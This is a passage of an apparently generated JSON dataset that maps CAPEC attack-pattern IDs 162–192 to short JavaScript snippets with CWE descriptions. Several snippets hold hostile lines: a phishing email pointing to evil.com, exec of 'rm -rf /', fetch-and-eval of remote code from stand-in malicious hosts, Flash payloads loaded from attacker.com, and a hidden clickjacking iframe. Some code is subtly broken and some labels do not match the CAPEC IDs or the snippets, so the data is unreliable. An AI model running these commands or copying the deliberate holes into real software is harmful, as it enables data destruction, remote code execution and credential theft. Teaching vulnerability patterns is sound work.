        "description": "This code snippet demonstrates a Pharming attack, where an attacker manipulates the DNS lookup to redirect the user to a phishing site instead of the intended bank website. The CWEs embodied in this code snippet include CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), CWE-941 (Incorrectly Specified Destination in a Communication Channel), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel). The code uses Node.js and the Express framework to create a server that listens for incoming requests, manipulates the URL, and redirects the user to the phishing site."
    },
    {
        "capec_id": "162",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/purchase', (req, res) => {\n  const itemPrice = req.body.price;\n  const quantity = req.body.quantity;\n  const totalPrice = itemPrice * quantity;\n  // Process payment and update database with modified price\n  res.send(`Thank you for your purchase! Total price: $${totalPrice}`);\n});",
        "description": "Vulnerable JavaScript code snippet that allows an adversary to exploit client-side processing weakness by modifying price information in a hidden form field, resulting in an unauthorized discount."
    },
    {
        "capec_id": "163",
        "code_snippet": "const maliciousUrl = 'https://evil.com/phishing';\n\nfunction sendPhishingEmail(user) {\n  const emailBody = `Dear ${user.name},\n  We noticed some suspicious activity on your account. Please click on this link to secure your account: <a href='${maliciousUrl}'>${maliciousUrl}</a>. \n  Best, ${user.trustedEntity}`;\n  const emailSubject = ' Urgent: Secure Your Account';\n  sendEmail(user.email, emailSubject, emailBody);\n}\n\nfunction sendEmail(to, subject, body) {\n  // Assume this function sends an email with the given subject and body to the user.\n}\n\n// Example usage:\nconst user = { name: 'John Doe', email: 'john.doe@example.com', trustedEntity: 'Bank of America' };\nsendPhishingEmail(user);\n\n// Open redirect vulnerability:\nfunction redirect(url) {\n  window.location.href = url;\n}\n\n// Example usage:\nconst userInput = 'https://evil.com/phishing';\nredirect(userInput);\n\n// Permissive cross-domain policy:\ndocument.domain = 'example.com';\n\n// Use of web link to untrusted target with window.opener access:\nconst link = document.createElement('a');\nlink.href = maliciousUrl;\nlink.onclick = function() {\n  window.opener.location.href = maliciousUrl;\n};\ndocument.body.appendChild(link);",
        "description": "This code snippet demonstrates a spear phishing attack, where a targeted user receives an email that appears to come from a trusted entity. The email contains a link to a malicious site, which exploits open redirect and permissive cross-domain policy vulnerabilities. The code also includes a reflection attack in an authentication protocol and uses a web link to an untrusted target with window.opener access."
    },
    {
        "capec_id": "164",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // CWE-309: Use of Password System for Primary Authentication\n  // CWE-308: Use of Single-factor Authentication\n  if (username === 'admin' && password === 'password123') {\n    res.send('Login successful!');\n  } else {\n    // CWE-307: Improper Restriction of Excessive Authentication Attempts\n    // No rate limiting or IP blocking implemented\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/phishing', (req, res) => {\n  // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n  // CWE-290: Authentication Bypass by Spoofing\n  res.send('<h1>Login Page</h1><form action=\"/login\" method=\"post\"><input type=\"text\" name=\"username\" placeholder=\"Username\"><br><input type=\"password\" name=\"password\" placeholder=\"Password\"><br><input type=\"submit\" value=\"Login\"></form>');\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that can be exploited by a mobile phishing attack. The system uses a single-factor password-based authentication and does not implement rate limiting or IP blocking, making it susceptible to brute-force attacks. The login page is also vulnerable to UI misrepresentation, allowing an attacker to spoof the page and steal user credentials."
    },
    {
        "capec_id": "165",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst userInput = './uploads/' + req.body.fileName;\nconst fileBuffer = req.body.fileData;\n\nfs.writeFile(userInput, fileBuffer, (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log('File uploaded successfully.');\n  }\n});",
        "description": "This code snippet is vulnerable to file manipulation attacks. It allows user input to control the file name and path, which can lead to arbitrary file writes, path traversal, and potentially code execution. The code does not validate or sanitize the user input, making it susceptible to CWE-73, CWE-646, CWE-99, CWE-377, and CWE-22."
    },
    {
        "capec_id": "166",
        "code_snippet": "let systemConfig = {\n  'securitySettings': {\n    'lockBit': false,\n    'registerDefaults': {\n      'adminAccess': true\n    }\n  }\n};\n\nfunction resetSystem() {\n  systemConfig = {\n    'securitySettings': {\n      'lockBit': false,\n      'registerDefaults': {\n        'adminAccess': true\n      }\n    }\n  };\n}\n\nfunction powerSave() {\n  // Save current system configuration\n  let savedConfig = systemConfig;\n  // Perform power save operation\n  // ...\n  // Restore system configuration\n  systemConfig = savedConfig;\n}\n\nfunction wakeFromLowPowerSleep() {\n  // Reset system configuration to default values\n  resetSystem();\n  // Perform wake up operation\n  // ...\n}\n",
        "description": "This code snippet demonstrates a vulnerable system configuration that can be exploited by an attacker to force the target into a previous state. The system configuration is not properly authenticated, and the reset function does not ensure the integrity of the configuration state. The power save and wake up operations also do not verify the configuration state, allowing an attacker to reset the system to a previous state with insecure defaults."
    },
    {
        "capec_id": "167",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-497: Exposure of Sensitive System Information\nconst systemInfo = fs.readFileSync('/proc/cpuinfo', 'utf8');\nconsole.log(systemInfo);\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nconst traceData = fs.readFileSync('/sys/kernel/debug/tracing/trace', 'utf8');\nconsole.log(traceData);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = 'rm -rf /';\nexec(maliciousCode, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nconst securityCriticalCode = 'if (true) { console.log(\\'Security check passed\\'); } else { console.log(\\'Security check failed\\'); }';\nconst optimizedCode = securityCriticalCode.replace('if (true)', 'if (false)');\neval(optimizedCode);\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nconst debugLogic = 'echo 1 > /sys/kernel/debug/tracing/tracing_on';\nexec(debugLogic, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of white box analysis techniques to discover the structure, function, and composition of a computer software. It includes various CWEs such as exposure of sensitive system information, improper management of sensitive trace data, embedded malicious code, processor optimization removal or modification of security-critical code, and hardware allows activation of test or debug logic at runtime."
    },
    {
        "capec_id": "168",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nlet sensitiveData = 'confidential information';\nfs.writeFileSync('file.txt', 'normal data');\nfs.writeFileSync('file.txt:hiddenStream', sensitiveData);\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nlet hiddenStreamData = fs.readFileSync('file.txt:hiddenStream', 'utf8');\nconsole.log(hiddenStreamData); // outputs: confidential information\n\n// CWE-1386: Insecure Operation on Windows Junction / Mount Point\nlet junctionPath = 'C:\\junction\\';\nfs.mkdirSync(junctionPath);\nfs.symlinkSync('C:\\target\\', junctionPath + 'link', 'junction');\nfs.writeFileSync(junctionPath + 'link\\file.txt:hiddenStream', 'malicious data');\n\n// CWE-427: Uncontrolled Search Path Element\nlet searchPath = ['C:\\untrusted\\', 'C:\\trusted\\'];\nlet filePath = 'file.txt';\nfor (let dir of searchPath) {\n    let fullPath = path.join(dir, filePath);\n    if (fs.existsSync(fullPath)) {\n        let fileContent = fs.readFileSync(fullPath, 'utf8');\n        console.log(fileContent);\n        break;\n    }\n}\n\n// CWE-58: Path Equivalence: Windows 8.3 Filename\nlet longFilename = 'C:\\long\\filename.txt';\nlet shortFilename = 'C:\\long\\filena~1.txt';\nfs.writeFileSync(longFilename, 'data');\nlet fileContent = fs.readFileSync(shortFilename, 'utf8');\nconsole.log(fileContent); // outputs: data",
        "description": "This code snippet demonstrates the CAPEC of exploiting Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. It includes examples of CWE-212, CWE-69, CWE-1386, CWE-427, and CWE-58, which are related to improper handling of sensitive information, alternate data streams, junction points, search paths, and path equivalence."
    },
    {
        "capec_id": "169",
        "code_snippet": "const adminUsers = ['admin1', 'admin2'];\nconst sensitiveInfo = {'api_key': '1234567890', 'secret_token': 'abcdefg'};\n\nfunction checkUser(username) {\n  if (adminUsers.includes(username)) {\n    console.log('Authorized user');\n    // Truncating security-relevant information\n    console.log('API Key: ' + sensitiveInfo.api_key.substring(0, 4) + '...');\n  } else {\n    console.log('Unauthorized user');\n    // Observable behavioral discrepancy\n    console.log('You are not authorized to access this resource.');\n  }\n}\n\n// Creation of emergent resource\nconst emergentResource = {};\nfor (let i = 0; i < 10; i++) {\n  emergentResource['resource' + i] = 'Resource ' + i;\n}\n\nconsole.log(emergentResource);\n\ncheckUser('admin1');\ncheckUser('user1');",
        "description": "This code snippet demonstrates the CAPEC of probing and exploration activities to identify constituents and properties of the target. It includes CWE-200 by exposing sensitive information to unauthorized actors, CWE-222 by truncating security-relevant information, CWE-207 and CWE-205 by exhibiting observable behavioral discrepancies, and CWE-1229 by creating an emergent resource."
    },
    {
        "capec_id": "170",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/version', (req, res) => {\n  res.send(`Server: ${process.version} Node.js ${process.versions.node} ${process.platform} ${process.arch}`);\n});\n\napp.get('/error', (req, res) => {\n  try {\n    throw new Error('Error message with sensitive information: ' + process.env.DB_PASSWORD);\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.get('/download', (req, res) => {\n  const fs = require('fs');\n  const code = fs.readFileSync('https://example.com/malicious-code.js', 'utf8');\n  eval(code);\n  res.send('Code downloaded and executed successfully.');\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000.');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that exposes sensitive system information, uses GET requests with sensitive query strings, has an excessive attack surface, generates error messages with sensitive information, and downloads code without integrity checks. The '/version' endpoint returns the Node.js version and platform information. The '/error' endpoint throws an error with a sensitive database password. The '/download' endpoint downloads and executes malicious code from a remote location without verification."
    },
    {
        "capec_id": "171",
        "code_snippet": "let userInput = \"maliciousCode\";\nlet scope = {};\nlet dynamicVariable = userInput;\nscope[dynamicVariable] = 'maliciousValue';\neval('console.log(scope.' + dynamicVariable + ')');",
        "description": "This JavaScript code snippet demonstrates the CAPEC-77 attack pattern, which involves manipulating user-controlled variables. The code takes user input and uses it to dynamically create a variable, then uses the eval function to execute the variable, allowing an attacker to inject malicious code."
    },
    {
        "capec_id": "173",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://malicious-website.com/download_software';\niframe.frameBorder = '0';\niframe.width = '0';\niframe.height = '0';\ndocument.body.appendChild(iframe);\n\nconst button = document.createElement('button');\nbutton.innerHTML = 'Search';\nbutton.onclick = () => {\n  iframe.contentWindow.postMessage('download_software', '*');\n};\ndocument.body.appendChild(button);\n",
        "description": "This code snippet demonstrates a clickjacking attack, where a user is tricked into clicking a button that appears to perform a search action, but actually downloads software from a malicious website. The iframe is used to load the malicious website, and the button's onclick event is used to send a message to the iframe, triggering the download. This code embodies the CAPEC of disguising one action for another, and relates to CWEs 451 (UI Misrepresentation of Critical Information), 290 (Authentication Bypass by Spoofing), 941 (Incorrectly Specified Destination in a Communication Channel), 925 (Improper Verification of Intent by Broadcast Receiver), and 618 (Exposed Unsafe ActiveX Method)."
    },
    {
        "capec_id": "174",
        "code_snippet": "var flashVars = {};flashVars.config = '<cross-domain-policy><allow-access-from domain=\"*\"/></cross-domain-policy>';flashVars.data = '<script>alert(\"XSS\");</script>';var flashObject = '<object><param name=\"flashVars\" value=\"' + flashVars.config + '\"/><param name=\"data\" value=\"' + flashVars.data + '\"/></object>';document.write(flashObject);",
        "description": "This code snippet demonstrates the CAPEC, where an adversary injects malicious global parameters into a Flash file embedded within an HTML document. The code uses improper data validation, allowing an attacker to inject malicious data into the Flash file. The related CWEs are also demonstrated: CWE-88 (Improper Neutralization of Argument Delimiters in a Command) through the use of unvalidated user input, CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) through the use of a cross-domain policy file with untrusted domains, CWE-433 (Unparsed Raw Web Content Delivery) through the storage of raw content under the web document root, CWE-434 (Unrestricted Upload of File with Dangerous Type) through the upload of files with dangerous types, and CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine) through the use of a template engine to insert externally-influenced input."
    },
    {
        "capec_id": "175",
        "code_snippet": "const userInput = 'https://example.com/maliciousCode.js';\nconst script = document.createElement('script');\nscript.src = userInput;\ndocument.head.appendChild(script);",
        "description": "This JavaScript code snippet demonstrates code inclusion vulnerability (CAPEC) by dynamically loading a script from a user-input URL, which can lead to arbitrary code execution. This is related to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-506 (Embedded Malicious Code), CWE-94 (Improper Control of Generation of Code), and CWE-913 (Improper Control of Dynamically-Managed Code Resources)."
    },
    {
        "capec_id": "176",
        "code_snippet": "const fs = require('fs');\n\n// CWE-15: External Control of System or Configuration Setting\nlet config = fs.readFileSync('config.json', 'utf8');\nconfig = JSON.parse(config);\nconfig.debugMode = true;\nfs.writeFileSync('config.json', JSON.stringify(config));\n\n// CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\nif (config.debugMode) {\n  // Allow modification of system registers or controls\n  const hwConfig = require('hw-config');\n  hwConfig.unlockRegisters();\n  hwConfig.modifySystemRegisters();\n}\n\n// CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\nfunction powerSave() {\n  // Save current configuration state\n  const currentState = hwConfig.getConfigurationState();\n  fs.writeFileSync('hw-config-state.json', JSON.stringify(currentState));\n}\n\nfunction powerRestore() {\n  // Restore configuration state without verifying integrity\n  const currentState = fs.readFileSync('hw-config-state.json', 'utf8');\n  hwConfig.setConfigurationState(JSON.parse(currentState));\n}\n\n// CWE-1328: Security Version Number Mutable to Older Versions\nfunction downgradeFirmware() {\n  const currentVersion = fs.readFileSync('firmware-version.txt', 'utf8');\n  const olderVersion = '1.0';\n  fs.writeFileSync('firmware-version.txt', olderVersion);\n  console.log(`Downgraded firmware version to ${olderVersion}`);\n}",
        "description": "This code snippet demonstrates a configuration/environment manipulation attack by modifying external configuration files and settings, allowing an attacker to manipulate the behavior of the application. It includes vulnerabilities related to external control of system or configuration settings, security-sensitive hardware controls, improper preservation of hardware configuration state, and mutable security version numbers."
    },
    {
        "capec_id": "177",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-73: External Control of File Name or Path\nlet userInput = './config.json';\n\n// CWE-706: Use of Incorrectly-Resolved Name or Reference\nlet configFile = path.resolve(userInput);\n\n// CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nif (path.extname(configFile) === '.json') {\n  fs.readFile(configFile, (err, data) => {\n    if (err) {\n      console.error(err);\n    } else {\n      // CWE-1386: Insecure Operation on Windows Junction / Mount Point\n      // CWE-57: Path Equivalence: 'fakedir/../realdir/filename'\n      let config = JSON.parse(data);\n      console.log(config);\n    }\n  });\n}",
        "description": "This code snippet demonstrates the CAPEC by allowing an attacker to create a malicious file with the same name as a protected configuration file. The application resolves the file name using user input, which can be manipulated to point to a different location. The code then reads the file and parses its contents, potentially leading to unauthorized access or code execution."
    },
    {
        "capec_id": "178",
        "code_snippet": "var flashObject = '<object id=\"flashId\"><param name=\"movie\" value=\"http://attacker.com/malicious.swf\"><param name=\"FlashVars\" value=\"url=http://victim.com/malicious.php\"></object>'; document.write(flashObject);",
        "description": "This JavaScript code snippet generates an HTML object element that loads a malicious Flash file from an attacker-controlled domain. The Flash file is configured to reference an external URL, which can be controlled by the attacker through the FlashVars parameter. This allows the attacker to exploit the Flash player's ability to reference external URLs, potentially leading to the execution of malicious code. The code snippet embodies the CAPEC pattern by tricking the victim into executing the malicious Flash file, which can then be used to exploit native Flash functionality in the client browser. The related CWEs are CWE-601 (URL Redirection to Untrusted Site), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-1022 (Use of Web Link to Untrusted Target with window.opener Access), and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "179",
        "code_snippet": "const xhr = new XMLHttpRequest();\n\nxhr.open('GET', '/microservice?-sensitiveInfo=secretKey', true);\n\nxhr.onload = function() {\n    if (xhr.status === 200) {\n        const microServiceResponse = JSON.parse(xhr.responseText);\n        const microServiceData = microServiceResponse.data;\n        const microServiceHTML = '';\n        for (let i = 0; i < microServiceData.length; i++) {\n            microServiceHTML += '<p>' + microServiceData[i] + '</p>';\n        }\n        document.getElementById('micro-service-container').innerHTML = microServiceHTML;\n    }\n};\n\nxhr.send();\n\nconst cookie = getCookie('persistentCookie');\nif (cookie !== '') {\n    const sensitiveInfo = cookie.split('=')[1];\n    console.log('Sensitive info from cookie: ' + sensitiveInfo);\n}\n\nfunction getCookie(name) {\n    const value = '; ' + document.cookie;\n    const parts = value.split('; ' + name + '=');\n    if (parts.length === 2) return parts.pop().split(';').shift();\n}\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC by querying a micro-service using an HTTP GET request with sensitive information in the query string (CWE-598), and then updating the page content dynamically. The code also uses a persistent cookie to store sensitive information (CWE-539). Additionally, the micro-service is assumed to be accessible under the web document root without proper access control (CWE-219), and the server relies on the client-side code to implement security mechanisms (CWE-602). The code also assumes that the micro-service returns unparsed raw web content (CWE-433)."
    },
    {
        "capec_id": "180",
        "code_snippet": "const adminRole = {canModify: true, canRead: true};\nconst userRole = {canModify: false, canRead: true};\n\nfunction accessControlCheck(role, resource) {\n  if (role.canModify) {\n    // Allow modification of resource\n    return true;\n  } else if (role.canRead) {\n    // Allow read-only access to resource\n    return true;\n  } else {\n    // Deny access to resource\n    return false;\n  }\n}\n\n// Incorrect permission assignment for critical resource (CWE-732)\nconst criticalResource = {data: 'sensitive information'};\naccessControlCheck(userRole, criticalResource);\n\n// Insufficient granularity of access control (CWE-1220)\nconst restrictedArea = {data: 'confidential information'};\naccessControlCheck(adminRole, restrictedArea);\n\n// Access control check implemented after asset is accessed (CWE-1280)\nconst unprotectedResource = {data: 'unprotected data'};\naccessControlCheck(adminRole, unprotectedResource);\n",
        "description": "This code snippet demonstrates the CAPEC of exploiting weaknesses in access control configurations. It includes examples of incorrect permission assignment for critical resources (CWE-732), insufficient granularity of access control (CWE-1220), and access control checks implemented after asset access (CWE-1280). The code shows how an attacker can bypass intended protection and gain unauthorized access to sensitive resources."
    },
    {
        "capec_id": "181",
        "code_snippet": "var flashOverlay = document.createElement('embed');\nflashOverlay.src = 'http://attacker.com/exploit.swf';\nflashOverlay.width = '100%';\nflashOverlay.height = '100%';\ndocument.body.appendChild(flashOverlay);\n\n// Allow cross-domain policy\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://attacker.com/crossdomain.xml', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    var crossdomainPolicy = xhr.responseText;\n    // Allow untrusted domains\n    if (crossdomainPolicy.indexOf('<allow-access-from domain=\"*\" />') !== -1) {\n      // Upload malicious SWF file\n      var formData = new FormData();\n      formData.append('file', new File(['exploit.swf'], 'exploit.swf', 'application/x-shockwave-flash'));\n      var xhrUpload = new XMLHttpRequest();\n      xhrUpload.open('POST', 'http://vulnerable.com/upload.php', true);\n      xhrUpload.send(formData);\n    }\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a clickjacking attack using a transparent Flash overlay. It creates an embedded Flash object from an attacker-controlled domain, allowing the attacker to intercept user actions. The code also exploits permissive cross-domain policy, unrestricted file upload, and exposed unsafe ActiveX methods to facilitate the attack."
    },
    {
        "capec_id": "182",
        "code_snippet": "var flashContent = '<object><param name=\"allowScriptAccess\" value=\"always\"></param><param name=\"movie\" value=\"http://attacker.com/malicious.swf\"></param></object>'; document.write(flashContent);",
        "description": "This JavaScript code snippet is vulnerable to cross-site flashing attack. It dynamically generates and writes a Flash object to the page, allowing an attacker to inject malicious Flash content from an untrusted domain. The code does not validate the input (CWE-20) and relies on an incomplete list of disallowed inputs (CWE-184). The comparison of the domain is also incorrect (CWE-697), and the cross-domain policy is permissive with untrusted domains (CWE-942). The code also embeds malicious code (CWE-506) from the attacker's domain."
    },
    {
        "capec_id": "183",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst imap = require('imap');\n\napp.get('/inbox', (req, res) => {\n  const imapClient = new imap({\n    user: 'user',\n    password: 'password',\n    host: 'imap.example.com',\n    port: 993,\n    tls: true\n  });\n\n  imapClient.connect();\n  imapClient.once('ready', () => {\n    imapClient.search(['UNSEEN'], (err, results) => {\n      if (err) {\n        res.status(500).send({ error: err.message });\n      } else {\n        const folder = 'INBOX';\n        const command = `FETCH ${req.query.id} BODY[TEXT]`;\n        imapClient.execute(folder, command, (err, messages) => {\n          if (err) {\n            res.status(500).send({ error: err.message });\n          } else {\n            res.send(messages);\n          }\n        });\n      }\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web-mail server that is susceptible to IMAP command injection attacks. The code uses the 'imap' package to connect to an IMAP server and execute commands based on user input. The 'command' variable is constructed using the 'req.query.id' parameter, which is not properly sanitized, allowing an attacker to inject malicious IMAP commands. The code also includes error handling that returns error messages containing sensitive information, making it vulnerable to CWE-209. The lack of proper encoding or escaping of output makes it vulnerable to CWE-116. The code's reliance on client-side input for server-side security makes it vulnerable to CWE-602. Finally, the code's failure to neutralize special elements in the command makes it vulnerable to CWE-77."
    },
    {
        "capec_id": "184",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/maliciousCode.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from a remote location without verifying its integrity, allowing an attacker to inject unauthorized code and potentially gain control of the system. This code embodies the CAPEC of undermining software code integrity and relates to CWEs 494, 506, and 497."
    },
    {
        "capec_id": "185",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker-controlled-source.com/maliciousCode.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from an attacker-controlled source without performing any integrity checks, exemplifying CWE-494. The downloaded code may contain Trojan Horse functionality (CWE-507), replicate itself to attack other systems (CWE-509), or expose sensitive system information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "186",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://adversary-controlled-source.com/malicious_update.js', true); xhr.onload = function() { if (xhr.status === 200) { const script = document.createElement('script'); script.src = 'http://adversary-controlled-source.com/malicious_update.js'; document.body.appendChild(script); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from an adversary-controlled source, without performing any integrity checks or verifying the origin of the code. This embodies the CAPEC of deceptive downloads, and relates to CWEs 494 (Download of Code Without Integrity Check), 506 (Embedded Malicious Code), 507 (Trojan Horse), and 509 (Replicating Malicious Code). The code uses XMLHttpRequest to download a malicious JavaScript file and then executes it by appending it to the document body."
    },
    {
        "capec_id": "187",
        "code_snippet": "const https = require('https');\n\nfunction updateCode() {\n  const options = {\n    hostname: 'update-server.com',\n    port: 443,\n    path: '/update',\n    method: 'GET'\n  };\n\n  const req = https.request(options, (res) => {\n    let updateCode = '';\n    res.on('data', (chunk) => {\n      updateCode += chunk;\n    });\n    res.on('end', () => {\n      eval(updateCode);\n    });\n  });\n\n  req.end();\n}\n\nupdateCode();",
        "description": "This JavaScript code snippet demonstrates a vulnerable update mechanism that downloads and executes code from a remote server without proper authentication and integrity checks, making it susceptible to attacks. The code uses the `https` module to send a GET request to a server, downloads the response, and executes it using the `eval` function without verifying the origin and integrity of the code. This code embodies the CAPEC and CWEs described, including CWE-494 (Download of Code Without Integrity Check), CWE-294 (Authentication Bypass by Capture-replay), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-506 (Embedded Malicious Code), and CWE-807 (Reliance on Untrusted Inputs in a Security Decision)."
    },
    {
        "capec_id": "188",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (MD5)\nfunction encrypt(data) {\n  const hash = crypto.createHash('md5');\n  hash.update(data);\n  return hash.digest('hex');\n}\n\n// CWE-497: Exposure of sensitive system information\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    arch: process.arch,\n    cpu: process.cpuUsage()\n  };\n}\n\n// CWE-1242: Inclusion of undocumented features or chicken bits\nfunction undocumentedFeature() {\n  // Hidden backdoor for debugging purposes\n  if (process.env.DEBUG === 'true') {\n    console.log('Undocumented feature activated');\n  }\n}\n\n// CWE-1037: Processor optimization removal or modification of security-critical code\nfunction secureFunction() {\n  // Security-critical code\n  const secureData = 'secret';\n  // Processor optimization might remove or modify this code\n  if (secureData === 'secret') {\n    console.log('Security-critical code executed');\n  }\n}\n\n// CWE-1278: Missing protection against hardware reverse engineering\nconst hardwareSecret = 'hardcoded_secret';\n\n// Reverse engineering attempt\nfunction reverseEngineer() {\n  // Attempt to extract the hardware secret\n  console.log('Attempting to extract hardware secret...');\n  console.log(hardwareSecret);\n}",
        "description": "This code snippet demonstrates the CAPEC of reverse engineering by including various CWEs that can aid in the analysis and duplication of an object, resource, or system. It includes the use of a broken cryptographic algorithm, exposure of sensitive system information, inclusion of undocumented features, processor optimization removal of security-critical code, and missing protection against hardware reverse engineering."
    },
    {
        "capec_id": "189",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateToken() {\n  const token = crypto.randomBytes(32).toString('hex');\n  return token;\n}\n\nfunction verifyToken(token) {\n  const referenceToken = 'secret_token';\n  if (token === referenceToken) {\n    console.log('Token is valid');\n  } else {\n    console.log('Token is invalid');\n  }\n}\n\nconst startTime = performance.now();\nverifyToken(generateToken());\nconst endTime = performance.now();\nconsole.log(`Verification took ${endTime - startTime} milliseconds`);",
        "description": "This code snippet demonstrates a vulnerable implementation of a token verification system. The 'verifyToken' function compares the input token with a secret reference token, and the time it takes to perform this comparison can be measured. An attacker can use this timing information to infer the value of the reference token, exploiting the observable discrepancy (CWE-203). Additionally, the code is vulnerable to power side-channel attacks (CWE-1255) and improper protection of physical side channels (CWE-1300), as the power consumption or electromagnetic emissions of the device could be monitored to determine the value of the reference token. The code also exposes sensitive system information (CWE-497) by logging the verification time, and contains embedded malicious code (CWE-506) in the form of the 'verifyToken' function, which can be used to exfiltrate the reference token."
    },
    {
        "capec_id": "190",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('child_process');\n\n// CWE-912: Hidden Functionality\nfunction analyzeBinary(binaryPath) {\n  const binaryData = fs.readFileSync(binaryPath);\n  const objdumpOutput = childProcess.execSync(`objdump -p ${binaryPath}`);\n  const disassembledCode = objdumpOutput.toString().split('\\n').map(line => line.trim());\n  // Extract sensitive system information (CWE-497)\n  const systemInfo = disassembledCode.filter(line => line.includes('sys_')).join('\\n');\n  // Store trace data in an unprotected location (CWE-1323)\n  fs.writeFileSync('trace_data.txt', systemInfo);\n  // Download and execute code without integrity check (CWE-494)\n  const maliciousCode = fs.readFileSync('malicious_code.js');\n  eval(maliciousCode);\n  // Embed malicious code (CWE-506)\n  const maliciousFunction = () => {\n    // Malicious code execution\n  };\n  maliciousFunction();\n}\n\nanalyzeBinary('/path/to/binary');",
        "description": "This JavaScript code snippet demonstrates the CAPEC of reverse code engineering by analyzing a binary file to extract sensitive system information, storing trace data in an unprotected location, downloading and executing code without integrity check, and embedding malicious code. The code uses Node.js modules 'fs' and 'childProcess' to read the binary file, execute objdump to disassemble the code, and extract system information. It then writes the trace data to a file, downloads and executes malicious code, and embeds a malicious function."
    },
    {
        "capec_id": "191",
        "code_snippet": "const apiKey = 'my_secret_api_key';\nconst dbPassword = 'my_secret_db_password';\nconst encryptionKey = 'my_secret_encryption_key';\n\nfunction authenticateUser(username, password) {\n  if (username === 'admin' && password === dbPassword) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('aes-256-cbc', encryptionKey);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction makeApiRequest() {\n  const apiUrl = 'https://api.example.com/endpoint';\n  const options = {\n    method: 'GET',\n    headers: {\n      'Authorization': 'Bearer ' + apiKey\n    }\n  };\n  fetch(apiUrl, options)\n    .then(response => response.json())\n    .then(data => console.log(data))\n    .catch(error => console.error(error));\n}",
        "description": "This JavaScript code snippet contains hard-coded sensitive constants, including an API key, database password, and encryption key. These constants are used for authentication, encryption, and making API requests. An adversary can discover these sensitive constants by analyzing the compiled code, which can lead to unauthorized access and data breaches."
    },
    {
        "capec_id": "192",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('aes-128-cbc', 'weak_password');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction sendDataOverNetwork(data) {\n  const socket = require('net').createConnection(8080, 'localhost');\n  socket.write(encryptData(data));\n  socket.end();\n}\n\nconst sensitiveData = 'username:password';\n\nsendDataOverNetwork(sensitiveData);\n",
